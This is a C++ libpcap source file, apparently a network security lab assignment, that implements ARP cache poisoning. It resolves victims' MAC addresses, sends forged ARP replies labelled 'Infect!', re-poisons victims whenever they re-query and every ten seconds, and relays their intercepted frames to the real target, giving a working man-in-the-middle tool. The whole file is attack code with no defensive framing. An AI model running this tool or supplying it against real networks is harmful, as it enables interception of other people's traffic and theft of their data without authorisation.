#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

pcap_t* handle;
Ip sender_ip[20];
Ip target_ip[20];
Mac my_mac;
Mac sender_mac[20];
Mac target_mac[20];

int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest){
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ =  Ip::SIZE;
	if(isRequest) packet.arp_.op_ = htons(ArpHdr::Request);
	else packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip); 
    packet.arp_.tmac_ = tmac; 
    packet.arp_.tip_ = htonl(tip); 
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    return res;
}

int GetMacAddr(const char* interface, uint8_t* mac_addr){
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("socket() FAILED\n");
		return -1;
	}

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("ioctl() FAILED\n");
		close(sockfd);
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6); // mac addr len
	close(sockfd);

	return 0;
}

void GetMacAddr2(char* arg[], int cnt){
	for(int i=0;i<cnt;i++){
		send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),my_mac,Mac::nullMac(),Ip("0.0.0.0"),Ip(arg[i+2]),true);

		struct pcap_pkthdr* header;
		const u_char* rcvpacket;
		PEthHdr ethernet_hdr;
		PArpHdr arp_hdr;
		while(true){ 
			int res = pcap_next_ex(handle, &header, &rcvpacket);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

			ethernet_hdr = (PEthHdr)rcvpacket;
			uint16_t eth_type = ethernet_hdr->type();
			if(eth_type == EthHdr::Arp){

				rcvpacket += sizeof(struct EthHdr);
				arp_hdr = (PArpHdr)rcvpacket;
				if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(arg[i+2]))) break;
			}
		}
		if(i%2==0){
			sender_mac[i/2] = Mac(arp_hdr->smac());
			sender_ip[i/2] = Ip(arg[i+2]);
		}
		else{
			target_mac[(i-1)/2] = Mac(arp_hdr->smac());
			target_ip[(i-1)/2] = Ip(arg[i+2]);
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc <4 || (argc%2)!=0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	int infect_cnt=(argc-2)/2;
	
	uint8_t my_mac_char[6];
	GetMacAddr(dev, my_mac_char);
	my_mac = Mac(my_mac_char);
	GetMacAddr2(argv, infect_cnt*2);

	for(int i=0;i<infect_cnt;i++){
		if(send_packet_arp(sender_mac[i],my_mac,sender_mac[i],Ip(target_ip[i]),Ip(sender_ip[i]),false)==0){
			printf("Infect! (INIT)\n");
		}
	}
	printf("Infect All (INIT)\n");

	struct pcap_pkthdr* header;
	const u_char* rcvpacket;
	PEthHdr ethernet_hdr;
	PArpHdr arp_hdr;

	time_t start_time = time(NULL);

	while(true){
		int res = pcap_next_ex(handle, &header, &rcvpacket);
		printf("rcv packet!\n");
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

		ethernet_hdr = (PEthHdr)rcvpacket;
		uint16_t eth_type = ethernet_hdr->type();

		if(eth_type == EthHdr::Arp){
			// sender ip address check, => re infection
			rcvpacket += sizeof(struct EthHdr);
			arp_hdr = (PArpHdr)rcvpacket;

			int i=-1;
			for(i=0;i<infect_cnt;i++){
				if(arp_hdr->sip()==sender_ip[i]&&arp_hdr->tip()==target_ip[i]) break;
			}
			if(i!=infect_cnt){
				if(send_packet_arp(Mac(arp_hdr->smac()),my_mac,Mac(arp_hdr->smac()),arp_hdr->tip(), arp_hdr->sip(),false)==0){
				printf("reinfect!\n");
				}
			}
		}
		else{
			int i=-1;
			for(i=0;i<infect_cnt;i++){
				if(sender_mac[i]==ethernet_hdr->smac_) break;
			}
			if(i!=infect_cnt){
				ethernet_hdr->dmac_ = target_mac[i];
				ethernet_hdr->smac_ = my_mac;
				if(pcap_sendpacket(handle, rcvpacket, header->len)!=0){
					printf("Error sending packet!\n");
				}
				else{
					printf("Packet sent succesfully.\n");
				}
			}
		}

		clock_t current_time = time(NULL);
		double elapsed_time = current_time - start_time;

		if(elapsed_time >= 10){
			int i;
			for(i=0;i<infect_cnt;i++) send_packet_arp(sender_mac[i],my_mac,sender_mac[i],Ip(target_ip[i]),Ip(sender_ip[i]), false);
			start_time = current_time;
		}
	}


	pcap_close(handle);
}
